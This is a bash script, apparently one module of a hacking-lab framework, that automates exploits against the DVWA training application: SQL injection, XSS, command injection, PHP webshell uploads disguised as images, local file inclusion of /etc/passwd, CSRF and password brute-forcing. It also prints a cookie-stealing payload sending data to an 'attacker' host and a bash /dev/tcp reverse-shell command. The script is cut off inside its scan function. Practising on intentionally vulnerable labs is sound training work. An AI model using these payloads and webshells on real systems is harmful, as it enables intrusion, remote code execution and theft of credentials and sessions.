#!/bin/bash
# modules/labs/dvwa/exploits.sh - Ghost00ls Framework v7.0 FINAL
# Tous les exploits DVWA avec Command Injection CORRIGÉ (POST method)
# Author: Ghost00ls Labs

# ==========================
# Sources & Configuration
# ==========================

source ~/ghost00ls/lib/colors.sh
source ~/ghost00ls/lib/banner.sh
source ~/ghost00ls/lib/exploits_common.sh

LOG_DIR="${HOME}/ghost00ls/logs/dvwa_exploits"
mkdir -p "$LOG_DIR"

# ==========================
# Session Management
# ==========================

detect_security_level() {
    local cookie_jar="$1"
    local base_url="$2"
    
    echo -e "${CYAN}[DEBUG] Détection du niveau de sécurité...${NC}"
    
    local resp=$(curl -s -b "$cookie_jar" -H "User-Agent: Mozilla/5.0" \
        "${base_url}/security.php" 2>/dev/null)
    
    if echo "$resp" | grep -qi "selected.*low"; then
        echo -e "${GREEN}[INFO] Niveau détecté: LOW${NC}"
        echo "low"
    elif echo "$resp" | grep -qi "selected.*medium"; then
        echo -e "${YELLOW}[INFO] Niveau détecté: MEDIUM${NC}"
        echo "medium"
    elif echo "$resp" | grep -qi "selected.*high"; then
        echo -e "${RED}[INFO] Niveau détecté: HIGH${NC}"
        echo "high"
    else
        echo -e "${CYAN}[INFO] Niveau par défaut: LOW${NC}"
        echo "low"
    fi
}

init_dvwa_session() {
    local cookie_jar="$1"
    local base_url="$2"
    
    echo -e "${YELLOW}[SESSION] Initialisation session DVWA...${NC}"
    
    # Étape 1: Accès page index
    echo -e "${CYAN}[DEBUG] GET ${base_url}/index.php${NC}"
    curl -s -b "$cookie_jar" -c "$cookie_jar" \
        -H "User-Agent: Mozilla/5.0" \
        "${base_url}/index.php" >/dev/null 2>&1
    sleep 1
    
    # Étape 2: Forcer security level à LOW
    echo -e "${CYAN}[DEBUG] POST ${base_url}/security.php (security=low)${NC}"
    curl -s -b "$cookie_jar" -c "$cookie_jar" \
        -H "User-Agent: Mozilla/5.0" \
        -X POST \
        -d "security=low&seclev_submit=Submit" \
        "${base_url}/security.php" >/dev/null 2>&1
    sleep 1
    
    # Étape 3: Vérification
    local level=$(detect_security_level "$cookie_jar" "$base_url")
    echo -e "${GREEN}[SUCCESS] Session initialisée (Level: $level)${NC}"
    
    return 0
}

# ==========================
# EXPLOIT 1: SQL Injection
# ==========================

exploit_sqli() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║   SQL Injection - Advanced Detection      ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Extraction de données via SQLi${NC}"
    echo -e "${YELLOW}⚠️  Risque : Fuite de données sensibles (users, passwords)${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Prepared statements, parameterized queries${NC}"
    echo

    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification en cours...${NC}"
    echo -e "${CYAN}[DEBUG] Target: ${BASE}/login.php${NC}"
    
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    local session=$(echo "$result" | cut -d'|' -f2)

    if [ -z "$session" ]; then
        echo -e "${RED}[ERROR] Échec authentification${NC}"
        read -p "👉 Entrée pour continuer... "
        return
    fi

    echo -e "${GREEN}[SUCCESS] Authentifié${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    echo -e "\n${YELLOW}[EXPLOIT] Test SQL Injection...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local payload="1' OR '1'='1"
    local encoded_payload="1%27+OR+%271%27%3D%271"
    
    echo -e "${CYAN}[DEBUG] Payload: $payload${NC}"
    
    local url="${BASE}/vulnerabilities/sqli/?id=${encoded_payload}&Submit=Submit"
    
    local tmpf=$(mktemp)
    curl -s -b "$cookie_jar" \
        -H "User-Agent: Mozilla/5.0" \
        "$url" > "$tmpf" 2>/dev/null

    if grep -qi "admin" "$tmpf" && grep -qi "gordon\|pablo" "$tmpf"; then
        echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  ✅ SQL INJECTION SUCCESS !           ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
        
        log_exploit "${LOG_DIR}/sqli.log" "SUCCESS" "SQLi - Bypass authentication"

        echo -e "\n${CYAN}📊 Utilisateurs extraits:${NC}"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        grep -ioE "admin|gordon|pablo|smithy|bob" "$tmpf" | sort -u | awk '{print "   🔹 " $0}'

        local hashes=$(grep -oE "[a-f0-9]{32}" "$tmpf" | head -n 5)
        if [ -n "$hashes" ]; then
            echo -e "\n${GREEN}🔐 Hash MD5 trouvés:${NC}"
            echo "$hashes" | awk '{print "   🔑 " $0}'
            
            echo -e "\n${YELLOW}[INFO] Cracking:${NC}"
            echo -e "${CYAN}   hashcat -m 0 -a 0 hash.txt wordlist.txt${NC}"
        fi
    else
        echo -e "\n${RED}❌ Aucune donnée extraite${NC}"
    fi

    rm -f "$tmpf"
    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 2: XSS Reflected
# ==========================

exploit_xss() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║       XSS Reflected - Cookie Stealing     ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Injection de scripts malveillants${NC}"
    echo -e "${YELLOW}⚠️  Risque : Session hijacking, cookie stealing${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Output encoding, CSP headers${NC}"
    echo

    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)

    echo -e "${GREEN}[SUCCESS] Authentifié${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    echo -e "\n${YELLOW}[EXPLOIT] Test XSS Reflected...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local payloads=(
        '<script>alert("XSS")</script>'
        '<img src=x onerror=alert("XSS")>'
        '<svg onload=alert("XSS")>'
    )
    
    local success=0
    local idx=1

    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}[Test $idx/3] $payload${NC}"
        
        local enc=$(urlenc "$payload")
        local url="${BASE}/vulnerabilities/xss_r/?name=${enc}"
        
        local tmpf=$(mktemp)
        curl -s -b "$cookie_jar" "$url" > "$tmpf" 2>/dev/null

        if grep -F "$payload" "$tmpf" >/dev/null 2>&1; then
            echo -e "${GREEN}✅ XSS SUCCESS !${NC}"
            
            echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║  ✅ XSS REFLECTED SUCCESS !           ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
            
            log_exploit "${LOG_DIR}/xss.log" "SUCCESS" "XSS: $payload"
            
            echo -e "\n${YELLOW}[INFO] Exploitation:${NC}"
            echo -e "${CYAN}   • Cookie stealing: <script>fetch('http://attacker/?c='+document.cookie)</script>${NC}"
            
            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "${RED}✗ Payload filtré${NC}"
        fi

        rm -f "$tmpf"
        idx=$((idx+1))
    done

    [ $success -eq 0 ] && echo -e "\n${RED}❌ Tous les payloads bloqués${NC}"

    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 3: Command Injection ✅ CORRIGÉ (POST)
# ==========================

exploit_cmdinj() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║   Command Injection - RCE Detection       ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Exécution de commandes système${NC}"
    echo -e "${YELLOW}⚠️  Risque : RCE (Remote Code Execution)${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Input validation, whitelist${NC}"
    echo

    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)

    if [ -z "$cookie_jar" ]; then
        echo -e "${RED}[ERROR] Échec auth${NC}"
        read -p "👉 Entrée... "
        return
    fi

    echo -e "${GREEN}[SUCCESS] Authentifié${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    echo -e "\n${YELLOW}[EXPLOIT] Test Command Injection (POST method)...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local success=0
    local payloads=(
        "127.0.0.1;id"
        "127.0.0.1; id"
        "127.0.0.1;whoami"
        "127.0.0.1; whoami"
        "127.0.0.1&&id"
        "127.0.0.1 && id"
        "127.0.0.1|id"
        "127.0.0.1 | id"
        "127.0.0.1; uname -a"
        "127.0.0.1; cat /etc/passwd | head -n 3"
    )

    local idx=1
    for payload in "${payloads[@]}"; do
        echo -e "${CYAN}╭───────────────────────────────────────────╮${NC}"
        echo -e "${CYAN}│ [Test $idx/10] $payload${NC}"
        echo -e "${CYAN}╰───────────────────────────────────────────╯${NC}"

        local tmpf=$(mktemp)
        
        # ✅ CORRECTION: POST au lieu de GET
        curl -s -b "$cookie_jar" \
            -H "User-Agent: Mozilla/5.0" \
            -H "Referer: ${BASE}/vulnerabilities/exec/" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -X POST \
            -d "ip=${payload}&Submit=Submit" \
            "${BASE}/vulnerabilities/exec/" > "$tmpf" 2>/dev/null

        local size=$(wc -c < "$tmpf")
        echo -e "${YELLOW}  Taille: ${size} bytes${NC}"

        # Recherche patterns RCE
        local uid=$(grep -o "uid=[0-9]*([^)]*)" "$tmpf" 2>/dev/null | head -n1)
        local gid=$(grep -o "gid=[0-9]*" "$tmpf" 2>/dev/null | head -n1)
        local www=$(grep -io "www-data" "$tmpf" 2>/dev/null | head -n1)
        local root=$(grep "^root:" "$tmpf" 2>/dev/null | head -n1)

        echo -e "${CYAN}  Patterns:${NC}"
        [ -n "$uid" ] && echo -e "    ${GREEN}✓ uid= : $uid${NC}" || echo -e "    ${RED}✗ uid=${NC}"
        [ -n "$gid" ] && echo -e "    ${GREEN}✓ gid=${NC}" || echo -e "    ${RED}✗ gid=${NC}"
        [ -n "$www" ] && echo -e "    ${GREEN}✓ www-data${NC}" || echo -e "    ${RED}✗ www-data${NC}"
        [ -n "$root" ] && echo -e "    ${GREEN}✓ root:${NC}" || echo -e "    ${RED}✗ root:${NC}"

        # SUCCESS si pattern trouvé
        if [ -n "$uid" ] || [ -n "$gid" ] || [ -n "$www" ] || [ -n "$root" ]; then
            echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║  ✅ COMMAND INJECTION SUCCESS !       ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
            
            log_exploit "${LOG_DIR}/cmdinj.log" "SUCCESS" "$payload"

            echo -e "\n${CYAN}📊 Output:${NC}"
            echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
            sed -n '/<\/form>/,/<h2>More Information<\/h2>/p' "$tmpf" | \
                sed 's/<[^>]*>//g' | grep -v "^$" | sed 's/^/   /'

            echo -e "\n${YELLOW}💡 Exploitation:${NC}"
            echo -e "${CYAN}   # Reverse shell${NC}"
            echo -e "   curl -b cookies.txt -X POST -d 'ip=127.0.0.1;bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"&Submit=Submit' ${BASE}/vulnerabilities/exec/"

            success=1
            rm -f "$tmpf"
            break
        else
            echo -e "  ${RED}✗ Aucune exécution${NC}"
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
        sleep 0.3
    done

    [ $success -eq 0 ] && echo -e "\n${RED}❌ Aucune exécution détectée${NC}"

    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 4: File Upload
# ==========================

exploit_upload() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║      File Upload - Webshell Injection     ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Upload et exécution de webshell${NC}"
    echo -e "${YELLOW}⚠️  Risque : RCE via webshell${NC}"
    echo -e "${GREEN}🛡️  Mitigation : File type validation${NC}"
    echo

    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)

    echo -e "${GREEN}[SUCCESS] Authentifié${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    # Récupérer token CSRF
    echo -e "\n${YELLOW}[CSRF] Récupération token...${NC}"
    local csrf_token=$(get_csrf_token "$cookie_jar" "$BASE")
    if [ -n "$csrf_token" ]; then
        echo -e "${GREEN}✅ Token: ${csrf_token:0:20}...${NC}"
    else
        echo -e "${YELLOW}⚠️  Pas de token (LOW level OK)${NC}"
    fi

    local workdir=$(mktemp -d)

    # Création de 3 webshells
    echo -e "\n${YELLOW}[PREPARE] Création webshells...${NC}"
    
    # Shell 1: PHP pur
    echo '<?php echo "GHOST_SHELL_OK"; system($_GET["cmd"]); ?>' > "${workdir}/shell.php"
    echo -e "${GREEN}✓ shell.php${NC}"
    
    # Shell 2: PHP avec GIF magic bytes (bypass type check)
    echo -n 'GIF89a' > "${workdir}/shell.gif"
    echo '<?php system($_GET["cmd"]); ?>' >> "${workdir}/shell.gif"
    echo -e "${GREEN}✓ shell.gif${NC}"
    
    # Shell 3: JPEG fake
    echo -n 'ÿØÿà' > "${workdir}/shell.jpg"
    echo '<?php system($_GET["cmd"]); ?>' >> "${workdir}/shell.jpg"
    echo -e "${GREEN}✓ shell.jpg${NC}"

    echo -e "\n${YELLOW}[EXPLOIT] Test upload (3 techniques)...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local files=("shell.php" "shell.gif" "shell.jpg")
    local success=0
    local idx=1

    for file in "${files[@]}"; do
        echo -e "${CYAN}╭───────────────────────────────────────────╮${NC}"
        echo -e "${CYAN}│ [Test $idx/3] $file${NC}"
        echo -e "${CYAN}╰───────────────────────────────────────────╯${NC}"

        local tmpf=$(mktemp)
        
        # Upload avec ou sans token CSRF
        if [ -n "$csrf_token" ]; then
            curl -s -b "$cookie_jar" \
                -H "User-Agent: Mozilla/5.0" \
                -H "Referer: ${BASE}/vulnerabilities/upload/" \
                -F "uploaded=@${workdir}/${file};filename=${file}" \
                -F "Upload=Upload" \
                -F "user_token=${csrf_token}" \
                "${BASE}/vulnerabilities/upload/" > "$tmpf" 2>/dev/null
        else
            curl -s -b "$cookie_jar" \
                -H "User-Agent: Mozilla/5.0" \
                -H "Referer: ${BASE}/vulnerabilities/upload/" \
                -F "uploaded=@${workdir}/${file};filename=${file}" \
                -F "Upload=Upload" \
                "${BASE}/vulnerabilities/upload/" > "$tmpf" 2>/dev/null
        fi

        local size=$(wc -c < "$tmpf")
        echo -e "${YELLOW}  Taille réponse: ${size} bytes${NC}"

        # Vérifier erreur CSRF
        if grep -q "CSRF token is incorrect" "$tmpf"; then
            echo -e "  ${RED}✗ Erreur CSRF token${NC}"
            rm -f "$tmpf"
            idx=$((idx+1))
            continue
        fi

        # Vérifier si upload réussi
        if grep -qi "successfully uploaded\|has been uploaded\|succesfully" "$tmpf"; then
            echo -e "  ${GREEN}✅ Upload réussi !${NC}"

            # Tester exécution
            local test_url="${BASE}/hackable/uploads/${file}"
            echo -e "  ${YELLOW}Test exec: $test_url${NC}"

            local exec_resp=$(curl -s -H "User-Agent: Mozilla/5.0" "$test_url" 2>/dev/null)

            if echo "$exec_resp" | grep -q "GHOST_SHELL_OK"; then
                echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
                echo -e "${GREEN}║  ✅ UPLOAD + EXECUTION SUCCESS !      ║${NC}"
                echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"

                log_exploit "${LOG_DIR}/upload.log" "SUCCESS" "$file"

                echo -e "\n${CYAN}📊 Webshell actif:${NC}"
                echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                echo -e "   🔹 Fichier: $file"
                echo -e "   🔹 URL: $test_url"

                echo -e "\n${YELLOW}💡 Exploitation:${NC}"
                echo -e "${CYAN}   curl \"$test_url?cmd=id\"${NC}"
                echo -e "${CYAN}   curl \"$test_url?cmd=whoami\"${NC}"

                # Test démo
                echo -e "\n${YELLOW}[DEMO] Test 'id':${NC}"
                local demo=$(curl -s "$test_url?cmd=id" 2>/dev/null | grep -o "uid=[^<]*")
                echo -e "${GREEN}   $demo${NC}"

                success=1
                rm -f "$tmpf"
                break
            else
                # Upload OK mais pas exécutable
                echo -e "  ${YELLOW}⚠️  Uploadé mais non exécutable${NC}"
                
                # Vérifier si c'est du PHP dans le contenu
                if echo "$exec_resp" | grep -q "<?php"; then
                    echo -e "  ${RED}PHP affiché en texte (pas interprété)${NC}"
                fi
            fi
        else
            echo -e "  ${RED}✗ Upload refusé${NC}"
            
            # Diagnostic
            if grep -qi "not allowed\|invalid\|extension" "$tmpf"; then
                echo -e "  ${YELLOW}Raison: Type de fichier rejeté${NC}"
            fi
            
            # Sauvegarder debug
            if [ $idx -eq 1 ]; then
                cp "$tmpf" "/tmp/dvwa_upload_debug.html"
                echo -e "  ${YELLOW}💾 Debug: /tmp/dvwa_upload_debug.html${NC}"
            fi
        fi

        rm -f "$tmpf"
        echo
        idx=$((idx+1))
    done

    if [ $success -eq 0 ]; then
        echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
        echo -e "${RED}║  ❌ AUCUN UPLOAD RÉUSSI               ║${NC}"
        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
        echo -e "${YELLOW}[INFO] Type validation active ou CSRF requis${NC}"
        
        echo -e "\n${CYAN}[DEBUG] Analyser:${NC}"
        echo -e "   cat /tmp/dvwa_upload_debug.html | grep -i \"upload\|error\"${NC}"
    fi

    rm -rf "$workdir"
    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 5: LFI
# ==========================

exploit_lfi() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║    LFI - Local File Inclusion Attack      ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Lecture fichiers système${NC}"
    echo -e "${YELLOW}⚠️  Risque : Information disclosure${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Path validation${NC}"
    echo

    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)

    echo -e "${GREEN}[SUCCESS] Authentifié${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    echo -e "\n${YELLOW}[EXPLOIT] Test LFI...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local encoded="..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    local url="${BASE}/vulnerabilities/fi/?page=${encoded}"

    local tmpf=$(mktemp)
    curl -s -b "$cookie_jar" "$url" > "$tmpf" 2>/dev/null

    if grep -q "root:x:0:0" "$tmpf"; then
        echo -e "${GREEN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  ✅ LFI SUCCESS !                     ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"

        log_exploit "${LOG_DIR}/lfi.log" "SUCCESS" "/etc/passwd"

        echo -e "\n${CYAN}📊 Extrait /etc/passwd:${NC}"
        grep ":" "$tmpf" | head -n 10 | sed 's/^/   /'
    else
        echo -e "${RED}❌ Fichier non accessible${NC}"
    fi

    rm -f "$tmpf"
    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 6: CSRF
# ==========================

exploit_csrf() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║    CSRF - Cross-Site Request Forgery      ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Forcer action non autorisée${NC}"
    echo -e "${YELLOW}⚠️  Risque : Actions au nom de la victime${NC}"
    echo -e "${GREEN}🛡️  Mitigation : CSRF tokens${NC}"
    echo

    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)

    echo -e "${GREEN}[SUCCESS] Authentifié${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    echo -e "\n${YELLOW}[EXPLOIT] Test CSRF...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local new_pass="ghost$(date +%S)"
    local resp=$(curl -s -b "$cookie_jar" \
        "${BASE}/vulnerabilities/csrf/?password_new=${new_pass}&password_conf=${new_pass}&Change=Change")

    if echo "$resp" | grep -qi "password.*changed"; then
        echo -e "${GREEN}╔═══════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  ✅ CSRF SUCCESS !                    ║${NC}"
        echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"

        log_exploit "${LOG_DIR}/csrf.log" "SUCCESS" "Password change"

        echo -e "\n${CYAN}📊 Nouveau password: $new_pass${NC}"
    else
        echo -e "${RED}❌ Protection CSRF active${NC}"
    fi

    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 7: Brute Force
# ==========================

exploit_bruteforce() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║       Brute Force - Login Attack          ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}📖 Objectif : Casser mot de passe${NC}"
    echo -e "${YELLOW}⚠️  Risque : Accès non autorisé${NC}"
    echo -e "${GREEN}🛡️  Mitigation : Rate limiting, CAPTCHA${NC}"
    echo

    check_tools curl || { read -p "👉 Entrée pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    local passwords=("password" "admin" "123456" "letmein" "dvwa")

    echo -e "\n${YELLOW}[EXPLOIT] Brute Force...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local success=0
    local idx=1

    for pass in "${passwords[@]}"; do
        echo -e "${CYAN}[Test $idx/${#passwords[@]}] admin / $pass${NC}"

        local cookie_jar=$(create_cookie_jar)
        local login_page=$(curl -s -c "$cookie_jar" "${BASE}/login.php")
        local token=$(echo "$login_page" | grep -oP "user_token.*value='\K[^']+")

        if [ -n "$token" ]; then
            curl -s -b "$cookie_jar" -c "$cookie_jar" -L \
                -d "username=admin&password=$pass&Login=Login&user_token=$token" \
                "${BASE}/login.php" >/dev/null 2>&1
        else
            curl -s -b "$cookie_jar" -c "$cookie_jar" -L \
                -d "username=admin&password=$pass&Login=Login" \
                "${BASE}/login.php" >/dev/null 2>&1
        fi

        sleep 0.5

        local resp=$(curl -s -b "$cookie_jar" "${BASE}/index.php")

        if echo "$resp" | grep -qi "Logout\|Welcome.*admin"; then
            echo -e "\n${GREEN}╔═══════════════════════════════════════╗${NC}"
            echo -e "${GREEN}║  ✅ BRUTE FORCE SUCCESS !             ║${NC}"
            echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"

            log_exploit "${LOG_DIR}/bruteforce.log" "SUCCESS" "admin/$pass"

            echo -e "\n${CYAN}📊 Credentials: admin / $pass${NC}"

            success=1
            cleanup_cookie_jar "$cookie_jar"
            break
        fi

        cleanup_cookie_jar "$cookie_jar"
        idx=$((idx+1))
    done

    [ $success -eq 0 ] && echo -e "\n${RED}❌ Aucun password trouvé${NC}"

    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p "👉 Entrée pour continuer... "
}

# ==========================
# EXPLOIT 8: Full Scan
# ==========================

full_scan() {
    clear
    banner
    echo -e "${MAGENTA}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║         Full Vulnerability Scan            ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════╝${NC}"
    echo

    local IP PORT
    IP=$(get_host_ip)

    read -p "🌐 IP [$IP]: " input; IP=${input:-$IP}
    read -p "🔌 Port [8081]: " PORT; PORT=${PORT:-8081}

    echo -e "\n${YELLOW}[SCAN] Démarrage...${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

    local report="${LOG_DIR}/scan_$(date +%Y%m%d_%H%M%S).txt"

    {
        echo "╔═══════════════════════════════════════════╗"
        echo "║       DVWA Full Vulnerability Scan        ║"
        echo "╚═══════════════════════════════════════════╝"
        echo ""
        echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Target: http://${IP}:${PORT}"
        echo "Scanner: Ghost00ls Framework v7.0"
        echo "═══════════════════════════════════════════"
        echo ""
    } | tee "$report"

    local result=$(login_form "http://${IP}:${PORT}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    init_dvwa_session "$cookie_jar" "http://${IP}:${PORT}"

    # Test 1: SQLi
    echo -e "${CYAN}[1/7] SQL Injection...${NC}" | tee -a "$report"
    local sqli=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit")
    echo "$sqli" | grep -q "admin" && echo "   ✅ VULNERABLE" | tee -a "$report" || echo "   ✅ PROTECTED" | tee -a "$report"

    # Test 2: XSS
    echo -e "${CYAN}[2/7] XSS...${NC}" | tee -a "$report"
    local xss=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/xss_r/?name=%3Cscript%3E")
    echo "$xss" | grep -q "<script>" && echo "   ✅ VULNERABLE" | tee -a "$report" || echo "   ✅ PROTECTED" | tee -a "$report"

    # Test 3: Command Injection (POST)
    echo -e "${CYAN}[3/7] Command Injection...${NC}" | tee -a "$report"
